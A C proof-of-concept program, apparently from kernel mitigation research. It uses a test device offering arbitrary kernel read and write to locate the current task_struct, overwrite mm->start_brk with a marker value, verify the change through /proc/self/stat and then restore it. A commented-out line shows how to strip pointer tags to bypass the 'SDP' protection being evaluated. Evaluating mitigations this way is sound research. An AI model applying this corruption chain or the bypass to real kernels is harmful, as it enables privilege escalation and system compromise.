// FZY: Add a simple proof of concept that corrupts task_struct.mm->start_brk
// Verified by reading /proc/self/stat before and after

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)
#define ARB_GET_CURRENT_TASK _IOR('A', 8, unsigned long)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

// Read the start_brk field from /proc/self/stat (field 45, 1-indexed)
unsigned long read_brk_from_proc(void) {
  FILE *f = fopen("/proc/self/stat", "r");
  if (!f) {
    perror("fopen /proc/self/stat");
    exit(1);
  }

  char buf[4096];
  if (!fgets(buf, sizeof(buf), f)) {
    perror("fgets");
    fclose(f);
    exit(1);
  }
  fclose(f);

  // Skip past the comm field (enclosed in parentheses) to avoid spaces in it
  char *p = strrchr(buf, ')');
  if (!p) {
    fprintf(stderr, "Failed to parse /proc/self/stat\n");
    exit(1);
  }
  p++; // skip ')'

  // Fields after comm: state(3), ppid(4), pgrp(5), session(6), tty_nr(7),
  // tpgid(8), flags(9), minflt(10), cminflt(11), majflt(12), cmajflt(13),
  // utime(14), stime(15), cutime(16), cstime(17), priority(18), nice(19),
  // num_threads(20), itrealvalue(21), starttime(22), vsize(23), rss(24),
  // rsslim(25), startcode(26), endcode(27), startstack(28), kstkesp(29),
  // kstkeip(30), signal(31), blocked(32), sigignore(33), sigcatch(34),
  // wchan(35), nswap(36), cnswap(37), exit_signal(38), processor(39),
  // rt_priority(40), policy(41), delayacct_blkio_ticks(42),
  // guest_time(43), cguest_time(44), start_data(45), end_data(46),
  // start_brk(47)
  // That's 45 fields after comm (fields 3-47), start_brk is 45th after ')'
  unsigned long val;
  int i;
  for (i = 3; i <= 47; i++) {
    while (*p == ' ')
      p++;
    if (i == 47) {
      val = strtoul(p, NULL, 10);
      return val;
    }
    while (*p && *p != ' ')
      p++;
  }

  fprintf(stderr, "Failed to find start_brk in /proc/self/stat\n");
  exit(1);
}

int main(int argc, char *argv[]) {
  printf("[+] task_struct.mm->start_brk Corruption PoC\n\n");

  if (argc != 4) {
    printf("Usage: %s <mode> <mm_offset> <brk_offset>\n", argv[0]);
    printf("  mode: 0 (no protection), 1/2 (SDP protection)\n");
    printf("  mm_offset: offset of mm pointer in task_struct\n");
    printf("             pahole -C task_struct vmlinux | grep -A1 'struct "
           "mm_struct.*mm'\n");
    printf("  brk_offset: offset of start_brk in mm_struct\n");
    printf("              pahole -C mm_struct vmlinux | grep -A1 'unsigned "
           "long.*start_brk'\n");
    return 1;
  }

  int fd = open("/dev/arb_rw", O_RDWR);
  if (fd < 0) {
    perror("open /dev/arb_rw");
    return 1;
  }
  printf("[+] Opened /dev/arb_rw\n");

  int mode = atoi(argv[1]);
  unsigned long mm_offset = strtoul(argv[2], NULL, 0);
  unsigned long brk_offset = strtoul(argv[3], NULL, 0);

  // Step 1: Get current task_struct address
  unsigned long task_addr;
  if (ioctl(fd, ARB_GET_CURRENT_TASK, &task_addr) < 0) {
    perror("ARB_GET_CURRENT_TASK");
    close(fd);
    return 1;
  }
  printf("[+] Current task_struct address: 0x%lx\n", task_addr);

  // Step 2: Read the mm pointer from task_struct
  unsigned long mm_ptr_addr = task_addr + mm_offset;
  unsigned long mm_addr;
  arb_read(fd, mm_ptr_addr, &mm_addr, sizeof(mm_addr));
  printf("[+] mm pointer at task_struct+%lu: 0x%lx\n", mm_offset, mm_addr);

  if (mode != 0) {
    printf("[+] SDP mode %d: mm pointer (tagged): 0x%lx\n", mode, mm_addr);
    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work
    // correctly
    // mm_addr = mm_addr | 0xFFFF000000000000;
  }

  // Step 3: Read the original start_brk from mm_struct
  unsigned long brk_addr = mm_addr + brk_offset;
  unsigned long orig_brk;
  arb_read(fd, brk_addr, &orig_brk, sizeof(orig_brk));
  printf("[+] mm->start_brk at mm_struct+%lu: 0x%lx\n", brk_offset, orig_brk);

  // Verify via /proc/self/stat
  unsigned long proc_brk = read_brk_from_proc();
  printf("[+] start_brk from /proc/self/stat: 0x%lx\n", proc_brk);

  // Step 4: Corrupt start_brk to a known marker value
  unsigned long corrupt_brk = 0xBEEFBEEFBEEF0000UL;
  printf("\n[+] Overwriting mm->start_brk to marker: 0x%lx\n", corrupt_brk);
  arb_write(fd, brk_addr, &corrupt_brk, sizeof(corrupt_brk));

  // Verify via arb_read
  unsigned long verify_brk;
  arb_read(fd, brk_addr, &verify_brk, sizeof(verify_brk));
  printf("[+] mm->start_brk after overwrite (arb_read): 0x%lx\n", verify_brk);

  // Verify via /proc/self/stat
  unsigned long proc_brk_after = read_brk_from_proc();
  printf("[+] start_brk from /proc/self/stat after: 0x%lx\n", proc_brk_after);

  // Show the manifestation
  printf("\n[+] === MANIFESTATION ===\n");
  if (proc_brk_after == corrupt_brk) {
    printf("[+] SUCCESS: /proc/self/stat reflects the corrupted start_brk!\n");
    printf("[+]   Before: 0x%lx\n", orig_brk);
    printf("[+]   After:  0x%lx\n", proc_brk_after);
    printf("[+] This proves task_struct.mm->start_brk was successfully corrupted\n");
    printf("[+] via the task_struct.mm indirection.\n");
  } else {
    printf("[-] /proc/self/stat does not reflect the change (unexpected)\n");
    printf("[-]   Expected: 0x%lx\n", corrupt_brk);
    printf("[-]   Got:      0x%lx\n", proc_brk_after);
  }

  // Step 5: Restore original start_brk
  printf("\n[+] Restoring original start_brk...\n");
  arb_write(fd, brk_addr, &orig_brk, sizeof(orig_brk));
  printf("[+] Restored mm->start_brk to: 0x%lx\n", orig_brk);

  close(fd);
  return 0;
}
